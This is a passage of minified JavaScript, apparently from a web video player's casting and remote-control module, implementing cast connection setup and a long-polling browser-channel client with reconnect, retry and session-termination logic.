        a = this.player;
        var b = g.bU(a);
        b && (b = b.qn()) && (b = new n$(a, b), g.L(this, b));
        b = new m$(a);
        g.L(this, b);
        g.pU(a, b.element, 4);
        this.aB = new l$();
        g.L(this, this.aB);
        g.pU(a, this.aB.element, 4);
        this.YE = !!c$();
      }
    },
    o$ = function (a) {
      a.WE && (a.player.removeEventListener("presentingplayerstatechange", a.WE), a.WE = null);
    },
    YBb = function (a, b, c) {
      a.gf = c;
      a.player.oa("presentingplayerstatechange", new g.IG(c, b));
    },
    p$ = function (a, b) {
      if (b.key !== a.Ms.key) if (b.key === a.Np.key) g$();else if (SBb(a) && ZBb(a), a.Ms = b, !a.player.U().L("disable_mdx_connection_in_mdx_module_for_music_web") || !g.ZG(a.player.U())) {
        var c = a.player.getPlaylistId();
        var d = a.player.getVideoData(1);
        var e = d.videoId;
        if (!c && !e || (2 === a.player.getAppState() || 1 === a.player.getAppState()) && a.player.U().L("should_clear_video_data_on_player_cued_unstarted")) d = null;else {
          var f = a.player.getPlaylist();
          if (f) {
            var h = [];
            for (var l = 0; l < f.getLength(); l++) h[l] = g.tV(f, l).videoId;
          } else h = [e];
          f = a.player.getCurrentTime(1);
          a = {
            videoIds: h,
            listId: c,
            videoId: e,
            playerParams: d.playerParams,
            clickTrackingParams: d.Aa,
            index: Math.max(a.player.getPlaylistIndex(), 0),
            currentTime: 0 === f ? void 0 : f
          };
          (d = exb(d)) && (a.locationInfo = d);
          d = a;
        }
        $9("Connecting to: " + g.Mm(b));
        "cast-selector-receiver" == b.key ? (b$(d || null), b = d || null, D9() ? B9().setLaunchParams(b) : A9("setLaunchParams called before ready.")) : !d && NBb() && Z9() == b.key ? m8("yt-remote-connection-change", !0) : (g$(), b$(d || null), d = Y9().Lk(), (b = h8(d, b.key)) && h$(b, 1));
      }
    },
    SBb = function (a) {
      var b = a.player.U();
      return !b.L("mdx_enable_privacy_disclosure_ui") || a.isLoggedIn() || a.YE || !a.aB ? !1 : g.oS(b) || g.qS(b);
    },
    ZBb = function (a) {
      a.player.Qb().isPlaying() ? a.player.pauseVideo() : (a.WE = function (b) {
        !a.YE && g.LG(b, 8) && (a.player.pauseVideo(), o$(a));
      }, a.player.addEventListener("presentingplayerstatechange", a.WE));
      a.aB && a.aB.rd();
      e$() || (i$ = !0);
    };
  g.Px.prototype.Ys = g.ca(0, function () {
    return g.Uj(this, 6);
  });
  var hzb = {
      "\x00": "\\0",
      "\b": "\\b",
      "\f": "\\f",
      "\n": "\\n",
      "\r": "\\r",
      "\t": "\\t",
      "\v": "\\x0B",
      '"': '\\"',
      "\\": "\\\\",
      "<": "\\u003C"
    },
    R8 = {
      "'": "\\'"
    },
    xxb = {
      qna: "atp",
      k2a: "ska",
      l_a: "que",
      QRa: "mus",
      j2a: "sus",
      qDa: "dsp",
      r0a: "seq",
      sQa: "mic",
      zua: "dpa",
      Coa: "cds",
      GRa: "mlm",
      nua: "dsdtr",
      qSa: "ntb",
      vdb: "vsp",
      ova: "scn",
      z_a: "rpe",
      jua: "dcn",
      kua: "dcp",
      RWa: "pas"
    },
    yxb = {
      g4: "u",
      CLASSIC: "cl",
      O3: "k",
      D1: "i",
      f1: "cr",
      U3: "m",
      A1: "g",
      HU: "up"
    };
  d8.prototype.equals = function (a) {
    return a ? this.id == a.id : !1;
  };
  var l8,
    Jxb = "";
  Rxb.prototype.flush = function (a, b) {
    a = void 0 === a ? [] : a;
    b = void 0 === b ? !1 : b;
    if (g.AB("enable_client_streamz_web")) {
      a = g.v(a);
      for (var c = a.next(); !c.done; c = a.next()) c = g.Rea(c.value), c = {
        serializedIncrementBatch: g.sg(c.j())
      }, g.gD("streamzIncremented", c, {
        sendIsolatedPayload: b
      });
    }
  };
  var n8,
    Zxb = Txb("loadCastFramework") || Txb("loadCastApplicationFramework"),
    byb = ["pkedcjkdefgpdelpbcmbmeomcjbeemfm", "enhhojjnijigcajfphajepfemndkmdlo"];
  g.lb(p8, g.J);
  g.k = p8.prototype;
  g.k.d2 = function (a) {
    this.D = arguments;
    this.j = !1;
    this.hd ? this.C = g.kb() + this.Pi : this.hd = g.ng(this.G, this.Pi);
  };
  g.k.stop = function () {
    this.hd && (g.Ra.clearTimeout(this.hd), this.hd = null);
    this.C = null;
    this.j = !1;
    this.D = [];
  };
  g.k.pause = function () {
    ++this.B;
  };
  g.k.resume = function () {
    this.B && (--this.B, !this.B && this.j && (this.j = !1, this.K.apply(null, this.D)));
  };
  g.k.ya = function () {
    this.stop();
    p8.Nf.ya.call(this);
  };
  g.k.e2 = function () {
    this.hd && (g.Ra.clearTimeout(this.hd), this.hd = null);
    this.C ? (this.hd = g.ng(this.G, this.C - g.kb()), this.C = null) : this.B ? this.j = !0 : (this.j = !1, this.K.apply(null, this.D));
  };
  g.w(q8, g.J);
  g.k = q8.prototype;
  g.k.CL = function (a) {
    this.C = arguments;
    this.hd || this.B ? this.j = !0 : dyb(this);
  };
  g.k.stop = function () {
    this.hd && (g.Ra.clearTimeout(this.hd), this.hd = null, this.j = !1, this.C = null);
  };
  g.k.pause = function () {
    this.B++;
  };
  g.k.resume = function () {
    this.B--;
    this.B || !this.j || this.hd || (this.j = !1, dyb(this));
  };
  g.k.ya = function () {
    g.J.prototype.ya.call(this);
    this.stop();
  };
  r8.prototype.stringify = function (a) {
    return g.Ra.JSON.stringify(a, void 0);
  };
  r8.prototype.parse = function (a) {
    return g.Ra.JSON.parse(a, void 0);
  };
  g.lb(eyb, g.wb);
  g.lb(fyb, g.wb);
  var gyb = null;
  g.lb(iyb, g.wb);
  g.lb(jyb, g.wb);
  g.lb(kyb, g.wb);
  v8.prototype.debug = function () {};
  v8.prototype.info = function () {};
  v8.prototype.warning = function () {};
  var syb = {},
    ryb = {};
  g.k = w8.prototype;
  g.k.setTimeout = function (a) {
    this.tb = a;
  };
  g.k.l2 = function (a) {
    a = a.target;
    var b = this.Ya;
    b && 3 == g.Tm(a) ? b.CL() : this.cT(a);
  };
  g.k.cT = function (a) {
    try {
      if (a == this.j) a: {
        var b = g.Tm(this.j),
          c = this.j.B,
          d = this.j.getStatus();
        if (!(3 > b) && (3 != b || g.rS || this.j && (this.B.B || g.Vm(this.j) || g.Wm(this.j)))) {
          this.Ka || 4 != b || 7 == c || (8 == c || 0 >= d ? s8(3) : s8(2));
          A8(this);
          var e = this.j.getStatus();
          this.Db = e;
          b: if (pyb(this)) {
            var f = g.Wm(this.j);
            a = "";
            var h = f.length,
              l = 4 == g.Tm(this.j);
            if (!this.B.C) {
              if ("undefined" === typeof TextDecoder) {
                y8(this);
                z8(this);
                var m = "";
                break b;
              }
              this.B.C = new g.Ra.TextDecoder();
            }
            for (c = 0; c < h; c++) this.B.B = !0, a += this.B.C.decode(f[c], {
              stream: l && c == h - 1
            });
            f.length = 0;
            this.B.j += a;
            this.K = 0;
            m = this.B.j;
          } else m = g.Vm(this.j);
          if (this.C = 200 == e) {
            if (this.Nb && !this.Va) {
              b: {
                if (this.j) {
                  var n = g.Xm(this.j, "X-HTTP-Initial-Response");
                  if (n && !g.gc(n)) {
                    var p = n;
                    break b;
                  }
                }
                p = null;
              }
              if (e = p) this.Va = !0, tyb(this, e);else {
                this.C = !1;
                this.N = 3;
                t8(12);
                y8(this);
                z8(this);
                break a;
              }
            }
            this.Fa ? (uyb(this, b, m), g.rS && this.C && 3 == b && (this.gb.Ta(this.ob, "tick", this.j2), this.ob.start())) : tyb(this, m);
            4 == b && y8(this);
            this.C && !this.Ka && (4 == b ? wyb(this.G, this) : (this.C = !1, x8(this)));
          } else g.Hfa(this.j), 400 == e && 0 < m.indexOf("Unknown SID") ? (this.N = 3, t8(12)) : (this.N = 0, t8(13)), y8(this), z8(this);
        }
      }
    } catch (q) {} finally {}
  };
  g.k.j2 = function () {
    if (this.j) {
      var a = g.Tm(this.j),
        b = g.Vm(this.j);
      this.K < b.length && (A8(this), uyb(this, a, b), this.C && 4 != a && x8(this));
    }
  };
  g.k.cancel = function () {
    this.Ka = !0;
    y8(this);
  };
  g.k.f2 = function () {
    this.ma = null;
    var a = Date.now();
    0 <= a - this.Jb ? (2 != this.Sa && (s8(3), t8(17)), y8(this), this.N = 2, z8(this)) : vyb(this, this.Jb - a);
  };
  g.k.getLastError = function () {
    return this.N;
  };
  g.k.qO = function () {
    return this.j;
  };
  Fyb.prototype.cancel = function () {
    this.C = Hyb(this);
    if (this.B) this.B.cancel(), this.B = null;else if (this.j && 0 !== this.j.size) {
      for (var a = g.v(this.j.values()), b = a.next(); !b.done; b = a.next()) b.value.cancel();
      this.j.clear();
    }
  };
  g.k = Lyb.prototype;
  g.k.dT = 8;
  g.k.Ch = 1;
  g.k.connect = function (a, b, c, d) {
    t8(0);
    this.jc = a;
    this.Ka = b || {};
    c && void 0 !== d && (this.Ka.OSID = c, this.Ka.OAID = d);
    this.Va = this.Hc;
    this.Na = Byb(this, null, this.jc);
    E8(this);
  };
  g.k.disconnect = function () {
    Nyb(this);
    if (3 == this.Ch) {
      var a = this.Za++,
        b = this.Na.clone();
      g.uo(b, "SID", this.D);
      g.uo(b, "RID", a);
      g.uo(b, "TYPE", "terminate");
      H8(this, b);
      a = new w8(this, this.D, a);
      a.Sa = 2;
      a.Z = $7(b.clone());
      b = !1;
      if (g.Ra.navigator && g.Ra.navigator.sendBeacon) try {
        b = g.Ra.navigator.sendBeacon(a.Z.toString(), "");
      } catch (c) {}
      !b && g.Ra.Image && (new Image().src = a.Z, b = !0);
      b || (a.j = oyb(a.G, null), a.j.send(a.Z));
      a.Aa = Date.now();
      x8(a);
    }
    Tyb(this);
  };
  g.k.eh = function () {
    return 0 == this.Ch;
  };
  g.k.getState = function () {
    return this.Ch;
  };
  g.k.fT = function (a) {
    if (this.K) if (this.K = null, 1 == this.Ch) {
      if (!a) {
        this.Za = Math.floor(1E5 * Math.random());
        a = this.Za++;
        var b = new w8(this, "", a),
          c = this.Y;
        this.Jb && (c ? (c = g.qd(c), g.sd(c, this.Jb)) : c = this.Jb);
        null !== this.N || this.rb || (b.Na = c, c = null);
        var d;
        if (this.tb) a: {
          for (var e = d = 0; e < this.C.length; e++) {
            b: {
              var f = this.C[e];
              if ("__data__" in f.map && (f = f.map.__data__, "string" === typeof f)) {
                f = f.length;
                break b;
              }
              f = void 0;
            }
            if (void 0 === f) break;
            d += f;
            if (4096 < d) {
              d = e;
              break a;
            }
            if (4096 === d || e === this.C.length - 1) {
              d = e + 1;
              break a;
            }
          }
          d = 1E3;
        } else d = 1E3;
        d = Qyb(this, b, d);
        e = this.Na.clone();
        g.uo(e, "RID", a);
        g.uo(e, "CVER", 22);
        this.Fa && g.uo(e, "X-HTTP-Session-Id", this.Fa);
        H8(this, e);
        c && (this.rb ? d = "headers=" + g.we(g.Kga(c)) + "&" + d : this.N && g.Zo(e, this.N, c));
        Ayb(this.B, b);
        this.Tf && g.uo(e, "TYPE", "init");
        this.tb ? (g.uo(e, "$req", d), g.uo(e, "SID", "null"), b.Nb = !0, nyb(b, e, null)) : nyb(b, e, d);
        this.Ch = 2;
      }
    } else 3 == this.Ch && (a ? Ryb(this, a) : 0 == this.C.length || Gyb(this.B) || Ryb(this));
  };
  g.k.eT = function () {
    this.Z = null;
    Syb(this);
    if (this.pd && !(this.ob || null == this.j || 0 >= this.kd)) {
      var a = 2 * this.kd;
      this.Ea = u8((0, g.fb)(this.F8, this), a);
    }
  };
  g.k.F8 = function () {
    this.Ea && (this.Ea = null, this.Va = !1, this.ob = !0, t8(10), C8(this), Syb(this));
  };
  g.k.dQ = function (a) {
    this.j == a && this.pd && !this.ob && (Myb(this), this.ob = !0, t8(11));
  };
  g.k.m2 = function () {
    null != this.ma && (this.ma = null, C8(this), yyb(this), t8(19));
  };
  g.k.Qba = function (a) {
    a ? t8(2) : t8(1);
  };
  g.k.isActive = function () {
    return !!this.G && this.G.isActive(this);
  };
  g.k = Vyb.prototype;
  g.k.jT = function () {};
  g.k.iT = function () {};
  g.k.hT = function () {};
  g.k.gT = function () {};
  g.k.isActive = function () {
    return !0;
  };
  g.k.n2 = function () {};
  g.lb(J8, g.Ed);
  J8.prototype.open = function () {
    this.j.G = this.C;
    this.K && (this.j.Sa = !0);
    this.j.connect(this.G, this.B || void 0);
  };
  J8.prototype.close = function () {
    this.j.disconnect();
  };
  J8.prototype.send = function (a) {
    var b = this.j;
    if ("string" === typeof a) {
      var c = {};
      c.__data__ = a;
      a = c;
    } else this.D && (c = {}, c.__data__ = g.Mm(a), a = c);
    b.C.push(new Eyb(b.Rf++, a));
    3 == b.Ch && E8(b);
  };
  J8.prototype.ya = function () {
    this.j.G = null;
    delete this.C;
    this.j.disconnect();
    delete this.j;
    J8.Nf.ya.call(this);
  };
  g.lb(Xyb, eyb);
  g.lb(Yyb, fyb);
  g.lb(I8, Vyb);
  I8.prototype.jT = function () {
    this.j.dispatchEvent("m");
  };
  I8.prototype.iT = function (a) {
    this.j.dispatchEvent(new Xyb(a));
  };
  I8.prototype.hT = function (a) {
    this.j.dispatchEvent(new Yyb(a));
  };
  I8.prototype.gT = function () {
    this.j.dispatchEvent("n");
  };
  var L8 = new g.Ed();
  g.w(azb, g.wb);
  g.k = N8.prototype;
  g.k.Ku = null;
  g.k.rq = !1;
  g.k.Px = null;
  g.k.EL = null;
  g.k.Nx = null;
  g.k.Ox = null;
  g.k.Zr = null;
  g.k.hs = null;
  g.k.Lu = null;
  g.k.aj = null;
  g.k.qG = 0;
  g.k.oo = null;
  g.k.pG = null;
  g.k.gs = null;
  g.k.dC = -1;
  g.k.h_ = !0;
  g.k.Ju = !1;
  g.k.DL = 0;
  g.k.oG = null;
  var fzb = {},
    ezb = {};
  g.k = N8.prototype;
  g.k.setTimeout = function (a) {
    this.B = a;
  };
  g.k.q2 = function (a) {
    a = a.target;
    var b = this.oG;
    b && 3 == g.Tm(a) ? b.CL() : this.kT(a);
  };
  g.k.kT = function (a) {
    try {
      if (a == this.aj) a: {
        var b = g.Tm(this.aj),
          c = this.aj.B,
          d = this.aj.getStatus();
        if (g.af && !g.Rc(10) || g.Sc && !g.Pc("420+")) {
          if (4 > b) break a;
        } else if (3 > b || 3 == b && !g.Vm(this.aj)) break a;
        this.Ju || 4 != b || 7 == c || (8 == c || 0 >= d ? this.j.Nn(3) : this.j.Nn(2));
        kzb(this);
        var e = this.aj.getStatus();
        this.dC = e;
        var f = g.Vm(this.aj);
        if (this.rq = 200 == e) {
          4 == b && P8(this);
          if (this.Fa) {
            for (a = !0; !this.Ju && this.qG < f.length;) {
              var h = gzb(this, f);
              if (h == ezb) {
                4 == b && (this.gs = 4, M8(15), a = !1);
                break;
              } else if (h == fzb) {
                this.gs = 4;
                M8(16);
                a = !1;
                break;
              } else lzb(this, h);
            }
            4 == b && 0 == f.length && (this.gs = 1, M8(17), a = !1);
            this.rq = this.rq && a;
            a || (P8(this), Q8(this));
          } else lzb(this, f);
          this.rq && !this.Ju && (4 == b ? this.j.rG(this) : (this.rq = !1, O8(this)));
        } else 400 == e && 0 < f.indexOf("Unknown SID") ? (this.gs = 3, M8(13)) : (this.gs = 0, M8(14)), P8(this), Q8(this);
      }
    } catch (l) {} finally {}
  };
  g.k.Q$ = function (a) {
    K8((0, g.fb)(this.P$, this, a), 0);
  };
  g.k.P$ = function (a) {
    this.Ju || (kzb(this), lzb(this, a), O8(this));
  };
  g.k.mZ = function (a) {
    K8((0, g.fb)(this.O$, this, a), 0);
  };
  g.k.O$ = function (a) {
    this.Ju || (P8(this), this.rq = a, this.j.rG(this), this.j.Nn(4));
  };
  g.k.cancel = function () {
    this.Ju = !0;
    P8(this);
  };
  g.k.o2 = function () {
    this.Px = null;
    var a = Date.now();
    0 <= a - this.EL ? (2 != this.Ox && this.j.Nn(3), P8(this), this.gs = 2, M8(18), Q8(this)) : jzb(this, this.EL - a);
  };
  g.k.getLastError = function () {
    return this.gs;
  };
  g.k = ozb.prototype;
  g.k.GL = null;
  g.k.Gj = null;
  g.k.eK = !1;
  g.k.B_ = null;
  g.k.FH = null;
  g.k.oP = null;
  g.k.HL = null;
  g.k.Ol = null;
  g.k.tq = -1;
  g.k.eC = null;
  g.k.HC = null;
  g.k.connect = function (a) {
    this.HL = a;
    a = T8(this.j, null, this.HL);
    M8(3);
    this.B_ = Date.now();
    var b = this.j.Y;
    null != b ? (this.eC = b[0], (this.HC = b[1]) ? (this.Ol = 1, pzb(this)) : (this.Ol = 2, qzb(this))) : (a8(a, "MODE", "init"), this.Gj = new N8(this), this.Gj.Ku = this.GL, dzb(this.Gj, a, !1, null, !0), this.Ol = 0);
  };
  g.k.O4 = function (a) {
    if (a) this.Ol = 2, qzb(this);else {
      M8(4);
      var b = this.j;
      b.Eo = b.Ks.tq;
      X8(b, 9);
    }
    a && this.Nn(2);
  };
  g.k.FL = function (a) {
    return this.j.FL(a);
  };
  g.k.abort = function () {
    this.Gj && (this.Gj.cancel(), this.Gj = null);
    this.tq = -1;
  };
  g.k.eh = function () {
    return !1;
  };
  g.k.lT = function (a, b) {
    this.tq = a.dC;
    if (0 == this.Ol) {
      if (b) {
        try {
          var c = this.B.parse(b);
        } catch (d) {
          a = this.j;
          a.Eo = this.tq;
          X8(a, 2);
          return;
        }
        this.eC = c[0];
        this.HC = c[1];
      } else a = this.j, a.Eo = this.tq, X8(a, 2);
    } else if (2 == this.Ol) if (this.eK) M8(7), this.oP = Date.now();else if ("11111" == b) {
      if (M8(6), this.eK = !0, this.FH = Date.now(), a = this.FH - this.B_, !g.af || g.Rc(10) || 500 > a) this.tq = 200, this.Gj.cancel(), M8(12), U8(this.j, this, !0);
    } else M8(8), this.FH = this.oP = Date.now(), this.eK = !1;
  };
  g.k.rG = function () {
    this.tq = this.Gj.dC;
    if (this.Gj.rq) 0 == this.Ol ? this.HC ? (this.Ol = 1, pzb(this)) : (this.Ol = 2, qzb(this)) : 2 == this.Ol && ((!g.af || g.Rc(10) ? !this.eK : 200 > this.oP - this.FH) ? (M8(11), U8(this.j, this, !1)) : (M8(12), U8(this.j, this, !0)));else {
      0 == this.Ol ? M8(9) : 2 == this.Ol && M8(10);
      var a = this.j;
      this.Gj.getLastError();
      a.Eo = this.tq;
      X8(a, 2);
    }
  };
  g.k.fC = function () {
    return this.j.fC();
  };
  g.k.isActive = function () {
    return this.j.isActive();
  };
  g.k.Nn = function (a) {
    this.j.Nn(a);
  };
  g.k = rzb.prototype;
  g.k.Do = null;
  g.k.gC = null;
  g.k.Rj = null;
  g.k.Lg = null;
  g.k.IL = null;
  g.k.sG = null;
  g.k.mT = null;
  g.k.tG = null;
  g.k.hC = 0;
  g.k.t2 = 0;
  g.k.Ei = null;
  g.k.qs = null;
  g.k.uq = null;
  g.k.Nu = null;
  g.k.Ks = null;
  g.k.eL = null;
  g.k.Sx = -1;
  g.k.nT = -1;
  g.k.Eo = -1;
  g.k.Rx = 0;
  g.k.Qx = 0;
  g.k.Mu = 8;
  g.lb(tzb, g.wb);
  g.lb(uzb, g.wb);
  g.k = rzb.prototype;
  g.k.connect = function (a, b, c, d, e) {
    M8(0);
    this.IL = b;
    this.gC = c || {};
    d && void 0 !== e && (this.gC.OSID = d, this.gC.OAID = e);
    this.Z ? (K8((0, g.fb)(this.CV, this, a), 100), wzb(this)) : this.CV(a);
  };
  g.k.disconnect = function () {
    xzb(this);
    if (3 == this.j) {
      var a = this.hC++,
        b = this.sG.clone();
      g.uo(b, "SID", this.D);
      g.uo(b, "RID", a);
      g.uo(b, "TYPE", "terminate");
      W8(this, b);
      a = new N8(this, this.D, a);
      a.Ox = 2;
      a.Zr = $7(b.clone());
      new Image().src = a.Zr.toString();
      a.Nx = Date.now();
      O8(a);
    }
    Hzb(this);
  };
  g.k.CV = function (a) {
    this.Ks = new ozb(this);
    this.Ks.GL = this.Do;
    this.Ks.B = this.G;
    this.Ks.connect(a);
  };
  g.k.eh = function () {
    return 0 == this.j;
  };
  g.k.getState = function () {
    return this.j;
  };
  g.k.pT = function (a) {
    this.qs = null;
    Czb(this, a);
  };
  g.k.oT = function () {
    this.uq = null;
    this.Lg = new N8(this, this.D, "rpc", this.N);
    this.Lg.Ku = this.Do;
    this.Lg.DL = 0;
    var a = this.mT.clone();
    g.uo(a, "RID", "rpc");
    g.uo(a, "SID", this.D);
    g.uo(a, "CI", this.eL ? "0" : "1");
    g.uo(a, "AID", this.Sx);
    W8(this, a);
    if (!g.af || g.Rc(10)) g.uo(a, "TYPE", "xmlhttp"), dzb(this.Lg, a, !0, this.tG, !1);else {
      g.uo(a, "TYPE", "html");
      var b = this.Lg,
        c = !!this.tG;
      b.Ox = 3;
      b.Zr = $7(a.clone());
      izb(b, c);
    }
  };
  g.k.lT = function (a, b) {
    if (0 != this.j && (this.Lg == a || this.Rj == a)) if (this.Eo = a.dC, this.Rj == a && 3 == this.j) {
      if (7 < this.Mu) {
        try {
          var c = this.G.parse(b);
        } catch (d) {
          c = null;
        }
        if (Array.isArray(c) && 3 == c.length) {
          if (a = c, 0 == a[0]) a: {
            if (!this.uq) {
              if (this.Lg) if (this.Lg.Nx + 3E3 < this.Rj.Nx) V8(this), this.Lg.cancel(), this.Lg = null;else break a;
              Fzb(this);
              M8(19);
            }
          } else this.nT = a[1], 0 < this.nT - this.Sx && 37500 > a[2] && this.eL && 0 == this.Qx && !this.Nu && (this.Nu = K8((0, g.fb)(this.v2, this), 6E3));
        } else X8(this, 11);
      } else null != b && X8(this, 11);
    } else if (this.Lg == a && V8(this), !g.gc(b)) for (a = this.G.parse(b), b = 0; b < a.length; b++) c = a[b], this.Sx = c[0], c = c[1], 2 == this.j ? "c" == c[0] ? (this.D = c[1], this.tG = c[2], c = c[3], null != c ? this.Mu = c : this.Mu = 6, this.j = 3, this.Ei && this.Ei.sT(), this.mT = T8(this, this.fC() ? this.tG : null, this.IL), Dzb(this)) : "stop" == c[0] && X8(this, 7) : 3 == this.j && ("stop" == c[0] ? X8(this, 7) : "noop" != c[0] && this.Ei && this.Ei.rT(c), this.Qx = 0);
  };
  g.k.v2 = function () {
    null != this.Nu && (this.Nu = null, this.Lg.cancel(), this.Lg = null, Fzb(this), M8(20));
  };
  g.k.rG = function (a) {
    if (this.Lg == a) {
      V8(this);
      this.Lg = null;
      var b = 2;
    } else if (this.Rj == a) this.Rj = null, b = 1;else return;
    this.Eo = a.dC;
    if (0 != this.j) if (a.rq) {
      if (1 == b) {
        b = Date.now() - a.Nx;
        var c = L8;
        c.dispatchEvent(new tzb(c, a.Lu ? a.Lu.length : 0, b, this.Rx));
        vzb(this);
        this.C.length = 0;
      } else Dzb(this);
    } else {
      c = a.getLastError();
      var d;
      if (!(d = 3 == c || 7 == c || 0 == c && 0 < this.Eo)) {
        if (d = 1 == b) this.Rj || this.qs || 1 == this.j || 2 <= this.Rx ? d = !1 : (this.qs = K8((0, g.fb)(this.pT, this, a), Ezb(this, this.Rx)), this.Rx++, d = !0);
        d = !(d || 2 == b && Fzb(this));
      }
      if (d) switch (c) {
        case 1:
          X8(this, 5);
          break;
        case 4:
          X8(this, 10);
          break;
        case 3:
          X8(this, 6);
          break;
        case 7:
          X8(this, 12);
          break;
        default:
          X8(this, 2);
      }
    }
  };
  g.k.s2 = function (a) {
    if (!g.Cb(arguments, this.j)) throw Error("Unexpected channel state: " + this.j);
  };
  g.k.Pba = function (a) {
    a ? M8(2) : (M8(1), Gzb(this, 8));
  };
  g.k.FL = function (a) {
    if (a) throw Error("Can't create secondary domain capable XhrIo object.");
    a = new g.Qm();
    a.K = !1;
    return a;
  };
  g.k.isActive = function () {
    return !!this.Ei && this.Ei.isActive(this);
  };
  g.k.Nn = function (a) {
    var b = L8;
    b.dispatchEvent(new uzb(b, a));
  };
  g.k.fC = function () {
    return !(!g.af || g.Rc(10));
  };
  g.k = Izb.prototype;
  g.k.sT = function () {};
  g.k.rT = function () {};
  g.k.qT = function () {};
  g.k.JL = function () {};
  g.k.tT = function () {
    return {};
  };
  g.k.isActive = function () {
    return !0;
  };
  g.k = Jzb.prototype;
  g.k.isEmpty = function () {
    return 0 === this.j.length && 0 === this.B.length;
  };
  g.k.clear = function () {
    this.j = [];
    this.B = [];
  };
  g.k.contains = function (a) {
    return g.Cb(this.j, a) || g.Cb(this.B, a);
  };
  g.k.remove = function (a) {
    var b = this.j;
    var c = (0, g.heb)(b, a);
    0 <= c ? (g.Db(b, c), b = !0) : b = !1;
    return b || g.Fb(this.B, a);
  };
  g.k.hm = function () {
    for (var a = [], b = this.j.length - 1; 0 <= b; --b) a.push(this.j[b]);
    var c = this.B.length;
    for (b = 0; b < c; ++b) a.push(this.B[b]);
    return a;
  };
  g.w(Kzb, g.wb);
  g.w(Lzb, g.wb);
  g.lb(Y8, g.J);
  g.k = Y8.prototype;
  g.k.I$ = function () {
    this.Pi = Math.min(3E5, 2 * this.Pi);
    this.C();
    this.B && this.start();
  };
  g.k.start = function () {
    var a = this.Pi + 15E3 * Math.random();
    g.Cu(this.j, a);
    this.B = Date.now() + a;
  };
  g.k.stop = function () {
    this.j.stop();
    this.B = 0;
  };
  g.k.isActive = function () {
    return this.j.isActive();
  };
  g.k.reset = function () {
    this.j.stop();
    this.Pi = 5E3;
  };
  g.lb(Nzb, Izb);
  g.k = Nzb.prototype;
  g.k.subscribe = function (a, b, c) {
    return this.C.subscribe(a, b, c);
  };
  g.k.unsubscribe = function (a, b, c) {
    return this.C.unsubscribe(a, b, c);
  };
  g.k.Bh = function (a) {
    return this.C.Bh(a);
  };
  g.k.oa = function (a, b) {
    return this.C.oa.apply(this.C, arguments);
  };
  g.k.dispose = function () {
    this.ma || (this.ma = !0, g.sb(this.C), this.disconnect(), g.sb(this.B), this.B = null, this.qa = function () {
      return "";
    });
  };
  g.k.isDisposed = function () {
    return this.ma;
  };
  g.k.connect = function (a, b, c) {
    if (!this.j || 2 != this.j.getState()) {
      this.Y = "";
      this.B.stop();
      this.K = a || null;
      this.G = b || 0;
      a = this.Aa + "/test";
      b = this.Aa + "/bind";
      var d = new rzb(c ? c.firstTestResults : null, c ? c.secondTestResults : null, this.Sa),
        e = this.j;
      e && (e.Ei = null);
      d.Ei = this;
      this.j = d;
      Ozb(this);
      if (this.j) {
        d = g.yB("ID_TOKEN");
        var f = this.j.Do || {};
        d ? f["x-youtube-identity-token"] = d : delete f["x-youtube-identity-token"];
        this.j.Do = f;
      }
      e ? (3 != e.getState() && 0 == zzb(e) || e.getState(), this.j.connect(a, b, this.N, e.D, e.Sx)) : c ? this.j.connect(a, b, this.N, c.sessionId, c.arrayId) : this.j.connect(a, b, this.N);
    }
  };
  g.k.disconnect = function (a) {
    this.Z = a || 0;
    this.B.stop();
    Ozb(this);
    this.j && (3 == this.j.getState() && Czb(this.j), this.j.disconnect());
    this.Z = 0;
  };
  g.k.sendMessage = function (a, b) {
    a = {
      _sc: a
    };
    b && g.sd(a, b);
    this.B.isActive() || 2 == (this.j ? this.j.getState() : 0) ? this.D.push(a) : this.Mz() && (Ozb(this), yzb(this.j, a));
  };
  g.k.sT = function () {
    this.B.reset();
    this.K = null;
    this.G = 0;
    if (this.D.length) {
      var a = this.D;
      this.D = [];
      for (var b = 0, c = a.length; b < c; ++b) yzb(this.j, a[b]);
    }
    this.oa("handlerOpened");
    lxb(this.Na, "BROWSER_CHANNEL");
  };
  g.k.qT = function (a) {
    var b = 2 == a && 401 == this.j.Eo;
    4 == a || b || this.B.start();
    this.oa("handlerError", a, b);
    rxb(this.Fa, "BROWSER_CHANNEL");
  };
  g.k.JL = function (a, b) {
    if (!this.B.isActive()) this.oa("handlerClosed");else if (b) for (var c = 0, d = b.length; c < d; ++c) {
      var e = b[c].map;
      e && this.D.push(e);
    }
    nxb(this.Ea, "BROWSER_CHANNEL");
    a && this.Ya.j.KL("/client_streamz/youtube/living_room/mdx/browser_channel/pending_maps", a.length);
    b && this.Za.j.KL("/client_streamz/youtube/living_room/mdx/browser_channel/undelivered_maps", b.length);
  };
  g.k.tT = function () {
    var a = {
      v: 2
    };
    this.Y && (a.gsessionid = this.Y);
    0 != this.G && (a.ui = "" + this.G);
    0 != this.Z && (a.ui = "" + this.Z);
    this.K && g.sd(a, this.K);
    return a;
  };
  g.k.rT = function (a) {
    "S" == a[0] ? this.Y = a[1] : "gracefulReconnect" == a[0] ? (this.B.start(), this.j.disconnect()) : this.oa("handlerMessage", new Mzb(a[0], a[1]));
    pxb(this.Ka, "BROWSER_CHANNEL");
  };
  g.k.Mz = function () {
    return !!this.j && 3 == this.j.getState();
  };
  g.k.Jr = function (a) {
    (this.N.loungeIdToken = a) || this.B.stop();
    if (this.Va && this.j) {
      var b = this.j.Do || {};
      a ? b["X-YouTube-LoungeId-Token"] = a : delete b["X-YouTube-LoungeId-Token"];
      this.j.Do = b;
    }
  };
  g.k.Ys = function () {
    return this.N.id;
  };
  g.k.nt = function () {
    return this.B.isActive() ? this.B.B - Date.now() : NaN;
  };
  g.k.Ww = function () {
    var a = this.B;
    g.Du(a.j);
    a.start();
  };
  g.k.aba = function () {
    this.B.isActive();
    0 == zzb(this.j) && this.connect(this.K, this.G);
  };
  Z8.prototype.D = function (a, b, c, d) {
    b ? a(d) : a({
      text: c.responseText
    });
  };
  Z8.prototype.C = function (a, b) {
    a(Error("Request error: " + b.status));
  };
  Z8.prototype.G = function (a) {
    a(Error("request timed out"));
  };
  g.w(Qzb, g.Ed);
  g.k = Qzb.prototype;
  g.k.connect = function (a, b, c) {
    this.Cd.connect(a, b, c);
  };
  g.k.disconnect = function (a) {
    this.Cd.disconnect(a);
  };
  g.k.Ww = function () {
    this.Cd.Ww();
  };
  g.k.Ys = function () {
    return this.Cd.Ys();
  };
  g.k.nt = function () {
    return this.Cd.nt();
  };
  g.k.Mz = function () {
    return this.Cd.Mz();
  };
  g.k.A2 = function () {
    this.dispatchEvent("channelOpened");
